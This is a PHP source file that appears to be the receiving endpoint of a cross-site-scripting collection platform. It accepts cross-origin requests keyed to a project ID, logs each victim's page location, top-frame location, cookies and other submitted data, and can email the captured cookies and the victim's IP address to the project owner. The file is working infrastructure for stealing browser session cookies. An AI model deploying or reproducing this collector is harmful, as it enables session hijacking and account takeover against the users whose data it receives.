<?php
/** Prevent user from loading inc. file */
define ( "PMX_ENTRANCE", true );

require (dirname ( __FILE__ ) . '/public-init.php');
header ( "Access-Control-Allow-Origin:*" );
header ( 'Content-Type: text/json; charset=utf-8' );
$current_url = get_url ();
$URI = substr ( $current_url, strlen ( PMX_SITEURL ), strlen ( $current_url ) - strlen ( PMX_SITEURL ) );
$uri = explode ( '/', $URI );
$saltid = substr ( $uri [2], 0, 8 );
$pmxProj = new pmxProject ();
if ($pmxProj->isExistSaltID ( $saltid ) == FALSE) {
	exit ();
}
$id = $pmxProj->getIDbySlatID ( $saltid );
$detail = $pmxProj->getDetail ( $id );
if ($detail ['status'] == 0) {
	exit ();
}
$request_data = isset ( $_REQUEST ) ? $_REQUEST : array ();

$location = isset ( $_REQUEST ["location"] ) ? $_REQUEST ["location"] : "";
$toplocation = isset ( $_REQUEST ["toplocation"] ) ? $_REQUEST ["toplocation"] : "";
$cookies = isset ( $_REQUEST ["cookies"] ) ? $_REQUEST ["cookies"] : "";

if (isset ( $request_data ["location"] ))
	unset ( $request_data ["location"] );
if (isset ( $request_data ["toplocation"] ))
	unset ( $request_data ["toplocation"] );
if (isset ( $request_data ["cookies"] ))
	unset ( $request_data ["cookies"] );
$data = $request_data;

$pmxProjItem = new pmxProjectItem ( $id, $location, $toplocation, $cookies, $data );
if (! $pmxProjItem->addItem ()) {
	exit ();
}
if ($detail ['mailAlert'] == 1 && trim ( $detail ['mail'] ) != "") {
	pmx_mail ( $detail ['mail'], "You got a new message from " . get_ip (), $cookies );
}
